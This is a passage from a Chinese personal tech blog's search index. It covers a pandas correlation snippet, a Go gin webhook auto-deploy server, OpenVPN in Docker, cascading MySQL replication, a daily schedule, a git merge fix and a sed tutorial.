{E(Y^{2})-E^{2}(Y)}}}}$$\n# cov()函数：协方差 # corr()函数： pearson相关系统函数。 import pandas as pd # 房价增幅与m2增幅的相关性。 hprice = pd.Series([3.04, 22.93, 12.75, 22.6, 12.33], index=['2008','2009', '2010', '2011', '2012']) m2 = pd.Series([8.18, 18.38, 9.13, 7.82, 6.69], index=['2008','2009', '2010', '2011', '2012']) r1 = hprice.corr(m2) print(r1) # output: # 0.5239439145220387 参考  wiki-correlation 慕课昊天  ","permalink":"https://www.fenghong.tech/blog/python/python-images/","tags":["Python","numpy"],"title":"python numpy pandas"},{"categories":["golang"],"contents":"[TOC]\ngin use 自动部署项目\nWeb hooks干嘛用的？  Github Webhooks提供了一堆事件，这些事件在用户特定的操作下会被触发，比如创建分支(Branch)、库被fork、项目被star、用户push了代码等等。 我们可以自己写一个服务,将服务的URL交给Webhooks，当上述事件被触发时，Webhook会向这个服务发送一个POST请求，请求中附带着该事件相关的详细描述信息(即Payload)。 这样，我们就可以在自己服务中知道Github的什么事件被触发了，事件的内容是什么？据此我们就可以干一些自己想干的事了。能干什么呢？官方说You\u0026rsquo;re only limited by your imagination，就是说想干什么都行，就看你的想像力够不够 :)\n  当指定的事件发生时，我们将向您提供的每个URL发送POST请求。通过这个post请求，我们就能实现自动拉取仓库中的代码，更新到本地，最终实现自动化更新\n web Hook Post  Request URL  即前面配置中填写的\u0026quot;Payload URL\u0026rdquo;\n content-type  即前面配置中选择的\u0026quot;Content type\u0026rdquo;\n X-Hub-Signature  是对Payload计算得出的签名。当我们在前面的配置中输入了\u0026quot;Secret\u0026quot;后，Header中才会出现此项。官方文档对Secret作了详细说明，后面我们也会在代码中实现对它的校验\n1. 监听端口port:8000,监听的uri路径path,运行部署脚本sh,webhook的secret, 2. 使用-p 指定端口,使用-path 指定uri路径,使用-sh 指定运行脚本, 使用-s 指定密码, 3. 原理是通过webhook的Post,来校验sha1,通过校验则执行部署脚本 源码实现 源码如下\npackage main import ( \u0026quot;crypto/hmac\u0026quot; \u0026quot;crypto/sha1\u0026quot; \u0026quot;encoding/hex\u0026quot; \u0026quot;flag\u0026quot; \u0026quot;fmt\u0026quot; \u0026quot;github.com/gin-gonic/gin\u0026quot; \u0026quot;io\u0026quot; \u0026quot;log\u0026quot; \u0026quot;net/http\u0026quot; \u0026quot;os\u0026quot; \u0026quot;os/exec\u0026quot; ) var ( secret string port string path string shell string h bool ) // return true then deploy func gitPush(c *gin.Context) { matched, _ := VerifySignature(c) if !matched { err := \u0026quot;Signatures did not match\u0026quot; c.String(http.StatusForbidden, err) fmt.Println(err) return } fmt.Println(\u0026quot;Signatures is matched ~\u0026quot;) ReLaunch() c.String(http.StatusOK, \u0026quot;OK\u0026quot;) } // execute the shell scripts func ReLaunch() { cmd := exec.Command(\u0026quot;sh\u0026quot;, shell) err := cmd.Start() if err != nil { log.Fatal(err.Error()) } err = cmd.Wait() } // verifySignature func VerifySignature(c *gin.Context) (bool, error) { PayloadBody, err := c.GetRawData() if err != nil { return false, err } // Get Header with X-Hub-Signature XHubSignature := c.GetHeader(\u0026quot;X-Hub-Signature\u0026quot;) signature := getSha1Code(PayloadBody) fmt.Println(signature) return XHubSignature == signature, nil } // hmac-sha1 func getSha1Code(payloadBody []byte) string { h := hmac.New(sha1.New, []byte(secret)) h.Write(payloadBody) return \u0026quot;sha1=\u0026quot; + hex.EncodeToString(h.Sum(nil)) } func usage() { _, _ = fmt.Fprintf(os.Stderr, `deploy version: deploy:1.0.5 Usage: deploy [-p port] [-path UriPath] [-sh DeployShell] [-pwd WebhookSecret] Options: `) flag.PrintDefaults() } func defaultPage(g *gin.Context) { firstName := g.DefaultQuery(\u0026quot;firstName\u0026quot;,\u0026quot;test\u0026quot;) lastName := g.Query(\u0026quot;lastName\u0026quot;) g.String(http.StatusOK,\u0026quot;Hello %s %s, This is My deploy Server~\u0026quot;,firstName,lastName) } func init() { // use flag to change args flag.StringVar(\u0026amp;port, \u0026quot;p\u0026quot;, \u0026quot;8000\u0026quot;, \u0026quot;listen and serve port\u0026quot;) flag.StringVar(\u0026amp;secret, \u0026quot;pwd\u0026quot;, \u0026quot;hongfeng\u0026quot;, \u0026quot;deploy password\u0026quot;) flag.StringVar(\u0026amp;path, \u0026quot;path\u0026quot;, \u0026quot;/deploy/wiki\u0026quot;, \u0026quot;uri serve path\u0026quot;) flag.StringVar(\u0026amp;shell, \u0026quot;sh\u0026quot;, \u0026quot;/app/wiki.sh\u0026quot;, \u0026quot;deploy shell scritpt\u0026quot;) flag.BoolVar(\u0026amp;h, \u0026quot;h\u0026quot;, false, \u0026quot;show this help\u0026quot;) flag.Usage = usage } func main() { flag.Parse() if h { flag.Usage() return } // Disable Console Color, you don't need console color when writing the logs to file gin.DisableConsoleColor() // Logging to a file. f, _ := os.Create(\u0026quot;/logs/gin.log\u0026quot;) gin.DefaultWriter = io.MultiWriter(f) // Use the following code if you need to write the logs to file and console at the same time. // gin.DefaultWriter = io.MultiWriter(f, os.Stdout) router := gin.Default() router.GET(\u0026quot;/\u0026quot;, defaultPage) router.POST(path, gitPush) _ = router.Run(\u0026quot;:\u0026quot; + port) } github\n how to use  ##1. clone $ git clone https://github.com/oldthreefeng/ginuse ##2. bulid $ cd ginuse \u0026amp;\u0026amp; go run deploy.go ## 3. run ## windows deploy.exe -h deploy version: deploy:1.0.5 Usage: deploy [-p port] [-path UriPath] [-sh DeployShell] [-pwd WebhookSecret] Options: -h\tshow this help -p string listen and serve port (default \u0026quot;8000\u0026quot;) -path string url serve path (default \u0026quot;/deploy/wiki\u0026quot;) -pwd string deploy password (default \u0026quot;hongfeng\u0026quot;) -sh string deploy shell scritpt (default \u0026quot;/app/wiki.sh\u0026quot;) ## linux deploy -h deploy version: deploy:1.0.5 Usage: deploy [-p port] [-path UriPath] [-sh DeployShell] [-pwd WebhookSecret] Options: -h\tshow this help -p string listen and serve port (default \u0026quot;8000\u0026quot;) -path string url serve path (default \u0026quot;/deploy/wiki\u0026quot;) -pwd string deploy password (default \u0026quot;hongfeng\u0026quot;) -sh string deploy shell scritpt (default \u0026quot;/app/wiki.sh\u0026quot;) 验证 部署在服务器上,然后再github上添加webhook~部署成功\n./deploy [GIN-debug] [WARNING] Now Gin requires Go 1.6 or later and Go 1.7 will be required soon. [GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached. [GIN-debug] [WARNING] Running in \u0026quot;debug\u0026quot; mode. Switch to \u0026quot;release\u0026quot; mode in production. - using env:\texport GIN_MODE=release - using code:\tgin.SetMode(gin.ReleaseMode) [GIN-debug] GET / --\u0026gt; main.defaultPage (3 handlers) [GIN-debug] POST /deploy/wiki --\u0026gt; main.gitPush (3 handlers) [GIN-debug] Listening and serving HTTP on :8000 sha1=9cae3a92dba9c2221bdbdb0910007d8b191f5363 Signatures is matched ~ 练手的go项目,学习golang第15天~\n","permalink":"https://www.fenghong.tech/blog/go/gin-use-in-webhook/","tags":["go","gin"],"title":"gin实现webhook"},{"categories":["ops","docker"],"contents":"[TOC]\n部署openvpn-in-docker  说明,假定1.1.1.1这个是你的服务器公网ip.\n  生成默认的openvpn配置文件  ## 生成默认的openvpn配置 ## OVPN_DATA我这设置的是 /data/openvpn. 按需创建. [root@jx_develop openvpn]# docker run -v ${OVPN_DATA}:/etc/openvpn \\ --rm kylemanna/openvpn ovpn_genconfig -c -u udp://1.1.1.1 Unable to find image \u0026#39;kylemanna/openvpn:latest\u0026#39; locally latest: Pulling from kylemanna/openvpn 050382585609: Pull complete 944a899b9c42: Pull complete 59afa6e6f5d8: Pull complete f2941e48588b: Pull complete 18e0142d2a50: Pull complete Digest: sha256:266c52c3df8d257ad348ea1e1ba8f0f371625b898b0eba6e53c785b82f8d897e Status: Downloaded newer image for kylemanna/openvpn:latest Processing PUSH Config: \u0026#39;block-outside-dns\u0026#39; Processing Route Config: \u0026#39;192.168.254.0/24\u0026#39; Processing PUSH Config: \u0026#39;dhcp-option DNS 8.8.8.8\u0026#39; Processing PUSH Config: \u0026#39;dhcp-option DNS 8.8.4.4\u0026#39; Processing PUSH Config: \u0026#39;comp-lzo no\u0026#39; Successfully generated config Cleaning up before Exit ... [root@jx_develop openvpn]# ls ccd openvpn.conf ovpn_env.sh [root@jx_develop openvpn]# vim ovpn_env.sh [root@jx_develop openvpn]# ls ccd openvpn.conf ovpn_env.sh [root@jx_develop openvpn]# vim openvpn.conf 增加默认用户(可选) 默认的配置文件只有254个client链接，想要增加openvpn的用户数,必须增加子网数量计算子网数\n按需进行子网配置,当然,如果客户端数量小于254,即可默认设置,跳过这次操作即可. github上的上的的方法\n# server端 , 需要修改配置文件 openvpn.conf ## 比如是 192.168.16.1/20 这个子网. server 192.168.16.0 255.255.240.0 # 路由的子网也得匹配, 需要修改配置文件 ovpn_env.sh. route 192.168.16.1 255.255.240.0 全部的配置文件如下：\n$ cat openvpn.conf server 192.168.16.0 255.255.240.0 verb 3 key /etc/openvpn/pki/private/1.1.1.1.key ca /etc/openvpn/pki/ca.crt cert /etc/openvpn/pki/issued/1.1.1.1.crt dh /etc/openvpn/pki/dh.pem tls-auth /etc/openvpn/pki/ta.key key-direction 0 keepalive 10 60 persist-key persist-tun proto udp # Rely on Docker to do port mapping, internally always 1194 port 1194 dev tun0 status /tmp/openvpn-status.log user nobody group nogroup client-to-client comp-lzo no ### Route Configurations Below route 192.168.16.1 255.255.240.0 ### Push Configurations Below push \u0026#34;block-outside-dns\u0026#34; push \u0026#34;dhcp-option DNS 8.8.8.8\u0026#34; push \u0026#34;dhcp-option DNS 8.8.4.4\u0026#34; push \u0026#34;comp-lzo no\u0026#34; $ cat ovpn_env.sh declare -x OVPN_AUTH= declare -x OVPN_CIPHER= declare -x OVPN_CLIENT_TO_CLIENT=1 declare -x OVPN_CN=106.75.100.62 declare -x OVPN_COMP_LZO=0 declare -x OVPN_DEFROUTE=1 declare -x OVPN_DEVICE=tun declare -x OVPN_DEVICEN=0 declare -x OVPN_DISABLE_PUSH_BLOCK_DNS=0 declare -x OVPN_DNS=1 declare -x OVPN_DNS_SERVERS=([0]=\u0026#34;8.8.8.8\u0026#34; [1]=\u0026#34;8.8.4.4\u0026#34;) declare -x OVPN_ENV=/etc/openvpn/ovpn_env.sh declare -x OVPN_EXTRA_CLIENT_CONFIG=() declare -x OVPN_EXTRA_SERVER_CONFIG=() declare -x OVPN_FRAGMENT= declare -x OVPN_KEEPALIVE=\u0026#39;10 60\u0026#39; declare -x OVPN_MTU= declare -x OVPN_NAT=0 declare -x OVPN_PORT=1194 declare -x OVPN_PROTO=udp declare -x OVPN_PUSH=() declare -x OVPN_ROUTES=([0]=\u0026#34;192.168.16.1/20\u0026#34;) declare -x OVPN_SERVER=192.168.16.0/20 declare -x OVPN_SERVER_URL=udp://1.1.1.1 declare -x OVPN_TLS_CIPHER= 证书生成  初始化ca，dh等相关证书，要输入几次密码，都是确认Ca证书的密码\n [root@jx_develop openvpn]# docker run -v ${OVPN_DATA}:/etc/openvpn --rm -it kylemanna/openvpn ovpn_initpki init-pki complete; you may now create a CA or requests. Your newly created PKI dir is: /etc/openvpn/pki Using SSL: openssl OpenSSL 1.1.1c 28 May 2019 Enter New CA Key Passphrase: Re-Enter New CA Key Passphrase: Generating RSA private key, 2048 bit long modulus (2 primes) .....................................+++++ .........................+++++ e is 65537 (0x010001) Can\u0026#39;t load /etc/openvpn/pki/.rnd into RNG 140068301057352:error:2406F079:random number generator:RAND_load_file:Cannot open file:crypto/rand/randfile.c:98:Filename=/etc/openvpn/pki/.rnd You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Common Name (eg: your user, host, or server name) [Easy-RSA CA]:qianxiangtest CA creation complete and you may now import and sign cert requests. Your new CA certificate file for publishing is at: /etc/openvpn/pki/ca.crt Using SSL: openssl OpenSSL 1.1.1c 28 May 2019 Generating DH parameters, 2048 bit long safe prime, generator 2 This is going to take a long time ........................................................................................................................................................................+...................+..........................................................................................+..............................+..............................................................+...................................................................................................................................................................+.........................................................................................+........+.......................................+.........................................................................................................................................................................................................+...................................+...............................+........................................................................+...................................................+...................................................................+...........................................................................................................................................+..............................................................................................+......................................................................................................................+............................................................................+....................................................................................................................................................................................+................................+....................+.........................................................................................+..........................................................................................................................................................................................................+..........................................................................................................................+.....................................................................................................+....................................................................+.................................................+.........................................................................................................................+...........................................+..........................................................................................................................................................................................................................................................................+......................................+...........................+......+..........................................................................+..................................................................................................................++*++*++*++* DH parameters of size 2048 created at /etc/openvpn/pki/dh.pem Using SSL: openssl OpenSSL 1.1.1c 28 May 2019 Generating a RSA private key .................................+++++ .........+++++ writing new private key to \u0026#39;/etc/openvpn/pki/private/1.1.1.1.key.XXXXCOHnGl\u0026#39; ----- Using configuration from /etc/openvpn/pki/safessl-easyrsa.cnf Enter pass phrase for /etc/openvpn/pki/private/ca.key: Check that the request matches the signature Signature ok The Subject\u0026#39;s Distinguished Name is as follows commonName :ASN.1 12:\u0026#39;1.1.1.1\u0026#39; Certificate is to be certified until Jul 20 07:20:59 2022 GMT (1080 days) Write out database with 1 new entries Data Base Updated Using SSL: openssl OpenSSL 1.1.1c 28 May 2019 Using configuration from /etc/openvpn/pki/safessl-easyrsa.cnf Enter pass phrase for /etc/openvpn/pki/private/ca.key: An updated CRL has been created. CRL file: /etc/openvpn/pki/crl.pem 启动服务  暴露服务1194端口\n [root@jx_develop openvpn]# docker run -v $OVPN_DATA:/etc/openvpn -d -p 1194:1194/udp --cap-add=NET_ADMIN --name openvpn kylemanna/openvpn 2b5fefd34b6296aa09f95dfeb63556d6f386d0bbc77c8e5e6ce61552951ffd63 [root@jx_develop openvpn]# docker start openvpn openvpn 生成用户配置文件 生成的配置文件可以通过客户导入的方式,进行访问,无需配置,当然客户端支持anriod,ios,win7,win10,mac\n# cat sh/generate.sh #!/bin/bash read -p \u0026#34;please your username: \u0026#34; NAME docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn easyrsa build-client-full $NAME nopass docker run -v /data/openvpn:/etc/openvpn --rm kylemanna/openvpn ovpn_getclient $NAME \u0026gt; /data/openvpn/conf/\u0026#34;$NAME\u0026#34;.ovpn ### 禁用全局代理，仅代理内网vpn系统。 sed -i \u0026#34;/redirect-gateway def1/d\u0026#34; /data/openvpn/conf/\u0026#34;$NAME\u0026#34;.ovpn sed -i \u0026#34;/remote-cert-tls server/a\\route 10.9.0.0 255.255.0.0 vpn_gateway\u0026#34; /data/openvpn/conf/\u0026#34;$NAME\u0026#34;.ovpn sed -i \u0026#34;/remote-cert-tls server/a\\route-nopull\u0026#34; /data/openvpn/conf/\u0026#34;$NAME\u0026#34;.ovpn 删除用户授权配置文件 # cat sh/revoke.sh #!/bin/bash read -p \u0026#34;Delete username: \u0026#34; DNAME docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn:2.4 easyrsa revoke $DNAME docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn:2.4 easyrsa gen-crl docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn:2.4 rm -f /etc/openvpn/pki/reqs/\u0026#34;$DNAME\u0026#34;.req docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn:2.4 rm -f /etc/openvpn/pki/private/\u0026#34;$DNAME\u0026#34;.key docker run -v /data/openvpn:/etc/openvpn --rm -it kylemanna/openvpn:2.4 rm -f /etc/openvpn/pki/issued/\u0026#34;$DNAME\u0026#34;.crt 客户端路由配置 很多时候我们希望自己的客户端能够自定义路由，而且更该服务端的配置并不是一个相对较好的做法\n找到我们的 ovpn 配置文件\n到最后一行,去掉这个,这个我在脚本里面已经去掉了\nredirect-gateway def1即是我们全部流量走 VPN 的配置\n route-nopull  客户端加入这个参数后,OpenVPN 连接后不会添加路由,也就是不会有任何网络请求走 OpenVPN\n vpn_gateway  当客户端加入 route-nopull 后,所有出去的访问都不从 OpenVPN 出去,但可通过添加 vpn_gateway 参数使部分IP访问走 OpenVPN 出去,这里我写写在脚本里面自动生成了.\nroute 192.168.255.0 255.255.255.0 vpn_gateway route 192.168.10.0 255.255.255.0 vpn_gateway  net_gateway  和 vpn_gateway 相反,他表示在默认出去的访问全部走 OpenVPN 时,强行指定部分 IP 访问不通过 OpenVPN 出去\nmax-routes 1000 # 表示可以添加路由的条数,默认只允许添加100条路由,如果少于100条路由可不加这个参数 route 172.121.0.0 255.255.0.0 net_gateway ","permalink":"https://www.fenghong.tech/blog/ops/openvpn-in-docker/","tags":["ops","vpn","docker"],"title":"docker部署企业级应用openvpn"},{"categories":["mysql"],"contents":"mysql-slave-slave级联复制  Normally, a slave does not write to its own binary log any updates that are received from a master server. This option causes the slave to write the updates performed by its SQL thread to its own binary log. For this option to have any effect, the slave must also be started with the --log-bin option to enable binary logging. A warning is issued if you use the --log-slave-updates option without also starting the server with the --log-bin option.\n  --log-slave-updates is used when you want to chain replication servers. For example, you might want to set up replication servers using this arrangement:\n A -\u0026gt; B -\u0026gt; C  Here, A serves as the master for the slave B, and B serves as the master for the slave C. For this to work, B must be both a master and a slave. You must start both A and B with --log-bin to enable binary logging, and B with the --log-slave-updates option so that updates received from A are logged by B to its binary log.\n master上 在A服务器上配置my.cnf\nserver_id = 1 #独一无二的，不可以重复 log-bin=mysql.bin binlog-ignore-db=mysql skip-name-resolve /* dns 反向解析时间 * grant 时，必须使用ip不能使用主机名 */ slave1上 在B服务器上，此服务器既是C的master，又是A的slave，如果没有配置好，导致主从级联复制失效，配置完重启mysql服务。\nserver-id=2 read_only=TURE binlog-ignore-db=mysql log_slave_updates=1 /* 关键一步 */ log-bin=mysql.bin slave2上 在C服务器上，配置my.cnf，并重启mysql服务\nserver-id=2 read_only=TURE binlog-ignore-db=mysql 数据备份及同步 全备master数据库，在slave1上操作：\n$ wget 'http://udbbackup.cn-bj.ufileos.com/udcjw/udb-fup_20190717093059.sql.gz?UCloudPublicKey=ucloududb@ucloud.cn1426152414000604875621\u0026amp;Expires=1563342918\u0026amp;Signature=luF9VxjAhemQQ9I6n6E=' -O udb-fbackup_20190717093059.sql.gz $ gunzip udb_backup_20190717093059.sql.gz $ head -n25 udb_backup_20190717093059.sql -- -- Position to start replication or point-in-time recovery from (the master of this slave) -- -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000224', MASTER_LOG_POS=187983347; 配置主从同步，由于master数据量太大，如果一次性从零开始，会导致数据库io瓶颈，因此，\n先导入全备的数据,\n$ mysql -S /tmp/mysql.sock -uroot -ppassword \u0026lt; udb_backup_20190717093059.sql $ mysql -S /tmp/mysql.sock \u0026gt; CHANGE MASTER TO MASTER_HOST='master.host', MASTER_USER='replication', MASTER_PASSWORD='bigs3cret', MASTER_PORT=3306, MASTER_LOG_FILE='mysql-bin.000224', MASTER_LOG_POS=187983347, MASTER_CONNECT_RETRY=10; \u0026gt; start slave; \u0026gt; show slave status\\G 做完主从同步之后，开始全备slave1数据库,可以把slave1当成slave2的master了.在slave2上操作:\n$ mysqldump -uuser -hhost -ppassword -A -E -R --single-transaction --master-data=1 --flush-privileges \u0026gt; full-`date +%Y%m%d_%H%M%S`.sql $ head -n25 full-20190717_113628.sql -- CHANGE MASTER TO MASTER_LOG_FILE='mysql-bin.000024', MASTER_LOG_POS=129201560; 备份完数据后，开始导入数据\n$ mysql -S /data/mysqlslave/mysql/mysql.sock \u0026lt; full-20190717_113628.sql $ mysql -S /data/mysqlslave/mysql/mysql.sock mysql\u0026gt; CHANGE MASTER TO MASTER_HOST='master.host', MASTER_USER='replication', MASTER_PASSWORD='bigs3cret', MASTER_PORT=3306, MASTER_LOG_FILE='mysql-bin.000024', MASTER_LOG_POS=129201560, MASTER_CONNECT_RETRY=10; mysql\u0026gt; start slave; mysql\u0026gt; show slave status\\G *************************** 1. row *************************** Slave_IO_State: Waiting for master to send event Master_Host: 10.9.94.184 Master_User: bak Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000024 Read_Master_Log_Pos: 148379396 Relay_Log_File: relay-log.000002 Relay_Log_Pos: 19109915 Relay_Master_Log_File: mysql-bin.000024 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 148311192 Relay_Log_Space: 19178286 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 158 ---\u0026gt;\u0026gt; 不为0，说明未同步成功。 Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 168386232 Master_UUID: 57dd3b35-5478-525400f054ca Master_Info_File: /data/mysqlslave/data/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: updating Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 0 1 row in set (0.00 sec) mysql\u0026gt; show slave status\\G Slave_IO_State: Waiting for master to send event Master_Host: 10.9.94.184 Master_User: bak Master_Port: 3306 Connect_Retry: 10 Master_Log_File: mysql-bin.000024 Read_Master_Log_Pos: 148379396 Relay_Log_File: relay-log.000002 Relay_Log_Pos: 19178119 Relay_Master_Log_File: mysql-bin.000024 Slave_IO_Running: Yes Slave_SQL_Running: Yes Replicate_Do_DB: Replicate_Ignore_DB: Replicate_Do_Table: Replicate_Ignore_Table: Replicate_Wild_Do_Table: Replicate_Wild_Ignore_Table: Last_Errno: 0 Last_Error: Skip_Counter: 0 Exec_Master_Log_Pos: 148379396 Relay_Log_Space: 19178286 Until_Condition: None Until_Log_File: Until_Log_Pos: 0 Master_SSL_Allowed: No Master_SSL_CA_File: Master_SSL_CA_Path: Master_SSL_Cert: Master_SSL_Cipher: Master_SSL_Key: Seconds_Behind_Master: 0 Master_SSL_Verify_Server_Cert: No Last_IO_Errno: 0 Last_IO_Error: Last_SQL_Errno: 0 Last_SQL_Error: Replicate_Ignore_Server_Ids: Master_Server_Id: 168386232 Master_UUID: 57dd3b35-5478-525400f054ca Master_Info_File: /data/mysqlslave/data/master.info SQL_Delay: 0 SQL_Remaining_Delay: NULL Slave_SQL_Running_State: Slave has read all relay log; waiting for the slave I/O thread to update it Master_Retry_Count: 86400 Master_Bind: Last_IO_Error_Timestamp: Last_SQL_Error_Timestamp: Master_SSL_Crl: Master_SSL_Crlpath: Retrieved_Gtid_Set: Executed_Gtid_Set: Auto_Position: 0 主要查看是 Seconds_Behind_Master: 0这个数据，当为0的时候说明同步完成。 进行验证 在master上修改数据，查看slave1合slave2查询是否同步\nmysql\u0026gt; use qianxiang_fengkong; mysql\u0026gt; UPDATE t_fk_control_person SET number = CONCAT('QXHNR-00','871') where id= 871; 在slave1和slave2\nmysql\u0026gt; SELECT number from qianxiang_fengkong.t_fk_control_person WHERE id =871; +-------------+ | number | +-------------+ | QXHNR-00871 | +-------------+ 1 row in set (0.00 sec) ","permalink":"https://www.fenghong.tech/blog/mysql/mysql-slave-slave/","tags":["mysql"],"title":"mysql slave slave"},{"categories":["living"],"contents":"[TOC]\n题外话\u0026ndash;知乎-南竟大佬\n 前几天，一位好友同事打来电话交流了她的焦虑，她今年近40岁，处于中年的尴尬阶段，孩子刚满三岁，属于大龄婚育者。呆在目前的这家公司14年，可以说跟随着公司的发展而变老，在公司属于忠诚度极高的员工，十几年的职场生涯，让她成为公司的一块砖，哪里需要哪里搬，十几年间就职公司至少5个不同的部门。今年，公司战略调整，身为市场的她忽然尴尬的发现自己既没有位置也没有客户，痛苦至极，快40岁了还要从头再来，并且是在一个伴随着自己变老的公司从头再来。这14年里，她从来没有为自己的未来做过规划，为自己的发展做好定位，更没有时间管理可言，所以，当她悔恨的走进中年的路上，焦虑不已，进退两难。\n 最好的时间管理一定是适合自己的。\n作息表  7.40 起床，此时人体的机能已经恢复完毕，喝小半瓶的农夫山泉，清肠唤醒机体。 7:45-8:20 刷牙，洗漱；听听英文，学学词语 8:20-9:00 上班路途，听音乐放松一下心情。 9:00-12:00 工作 12:00-12:30 午餐 12:30-13:10 午休 13:10-13:30 静坐，放空自己，调整能量场,准备工作 13:30-18:00 工作 18:00-18:30 总结一天的工作合学习状态。记录在笔记本上， 一旦加班得缩短8点后的学习时间 18:30-19:10 回家路途 19:10-19:40 室内运动，俯卧撑等简易运动，运动完洗澡 19:40-20:00 晚餐，记得吃水果 20:00-22:00 处理工作或者看书，学习充电。（现阶段学习golang/c） 21:00-21:30 和老婆打电话 22:00-23:00 学习的mysql数据库 23:00-23:30 躺床上反思一天的不足。  于 上海浦东新区世纪金融广场 2019/07/16 记。\n","permalink":"https://www.fenghong.tech/blog/living/rest-learning/","tags":["learning"],"title":"rest\u0026\u0026learnong"},{"categories":["ops"],"contents":"Git的报错 在使用Git的过程中有时会出现一些问题，那么在解决了每个问题的时候，都需要去总结记录下来，下次不再犯。\nfatal: refusing to merge unrelated histories 好几天前开了新项目，开发人员在dev分支开发，对master没有写权限，从init提交到版本第一期快开发完了，才想到要合master。结果就发发生了这个错误，记录一下防止下次再犯.\n$ git pull $ git checkout master $ git merge develop fatal: refusing to merge unrelated histories ## 解决方案 ## $ git merge develop --allow-unrelated-histories 如果是git pull.\ngit pull fatal: refusing to merge unrelated histories $ git pull origin master --allow-unrelated-histories ","permalink":"https://www.fenghong.tech/blog/intro/git-unrelate/","tags":["git"],"title":"refusing to merge unrelated histories"},{"categories":["tools"],"contents":"[TOC]\n使用的是gnu sed, mac 下默认是bsd sed, mac下可以brew install gnu-sed\nStream EDitor, 流编辑器\n格式 $ sed options script file * -e script 可以指定多个-e(后面举例) * -f file 从文件读取sed规则 * -n 只输出匹配的行 替换(substitute) s/pattern/replacement/flag * 数字\t表明新文本将替换第几处模式匹配的地方 * g\t所有匹配的都替换 * p\t原来的内容也打印出来 * w file 将替换的结果写到文件中 限制行数 * 数字\t指定行数 * 数字1,数字2\t限定范围 * $表示结尾行 * * 其实还可以使用文本模式过滤器 * /pattern/command * eg. $ sed '/louis/s/bash/csh/' /etc/passwd 删除行 sed 'd' mydata\t#删除全部 sed '1d' mydata\t#删除第一行 这个同样也可以用于上面的模式匹配\n插入和附加 插入i会在指定行前插入一个新行 插入a会在指定行后插入一个新行 $ echo \u0026quot;Test Line 2\u0026quot; | sed 'i\\Test Line 1' Test Line 1 Test Line 2 $ echo \u0026quot;Test Line 2\u0026quot; | sed 'a\\Test Line 1' Test Line 2 Test Line 1 指定在某行插入字符串:\n# 在第5行插入hello world $ sed -i '5ihello world' FILE 参考 Insert a line at specific line number with sed or awk\n修改 字符c是修改指定行的整行内容 sed '3c\\'\t#修改第三行 转换 字符y是进行单个字符映射的转换，且是全局的 sed 'y/abc/123' mydata 会将所有的a转换成1，b转换成2，c转换成3 打印 * p 打印问本行 * #\t打印行号 * l\t列出行 文件操作 * w\t写入文件 * r\t读入文件  (以下内容参考 Software Design 03期的sed详解及用法)\n源文件:\n$ more input.txt aaabbbcccddd aaabbbcccddd AAABBBCCCDDD aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/'\u0026quot; 简单的替换:\n$ sed -e 's/bbb/eee/' input.txt aaaeeecccddd aaabbbcccddd AAABBBCCCDDD aaaeeecccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/'\u0026quot; 第一行前半部分的bbb被替换了, 后半部分没有; 第二行替换了;\n因为sed是流编辑器, 以行为处理单元, 默认一行处理一次;\n这里的-e没什么用, 可以不写.\n可以加上g标志, 表示全局作用:\n$ sed -e 's/bbb/eee/g' input.txt aaaeeecccddd aaaeeecccddd AAABBBCCCDDD aaaeeecccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ 也可以在指定行上操作, 如只在第一行:\n$ sed -e '1s/bbb/eee/g' input.txt aaaeeecccddd aaaeeecccddd AAABBBCCCDDD aaabbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ sed的基本格式:\nsed [选项, 如-e] '[开始行,结束行]命令/查找字符串/替换字符串/[标志, 如g]' 输出文本 [\u0026gt; 输出文本] 关于命令, 除了s(替换), 还有:\n d (删除) p (打印) y (替换一个字符) w (写文件) n TODO  标志除了g(global全局), 还有:\n p (print 打印) w (write 输出文件)  可以同时指定多个标志\nsed的默认分隔符是`/\u0026rsquo;, 可以替换为其它字符. 比如替换路径时, 因为用反斜杠转义比较麻烦, 可以改分隔符:\n$ sed 's!/bin/bash!/bin/zsh!' /etc/passwd 替换字符串中, \u0026amp;表示匹配的字符串:\n $ sed -e 's/bbb/+\u0026amp;+/g' input.txt aaa+bbb+cccddd aaa+bbb+cccddd AAABBBCCCDDD aaa+bbb+cccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ sed -e 's/.*/output: \u0026amp;/g' input.txt output: aaabbbcccddd aaabbbcccddd output: AAABBBCCCDDD aaabbbcccddd output: 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ p标志会打印替换的行(替换后的内容), 可以配合-n只输出替换的行:\n$ sed -e 's/aaa/EEE/' input.txt EEEbbbcccddd aaabbbcccddd AAABBBCCCDDD EEEbbbcccddd 1234567890!? !\u0026quot;#$%\u0026amp;'()?/ $ sed -e 's/aaa/EEE/p' input.txt 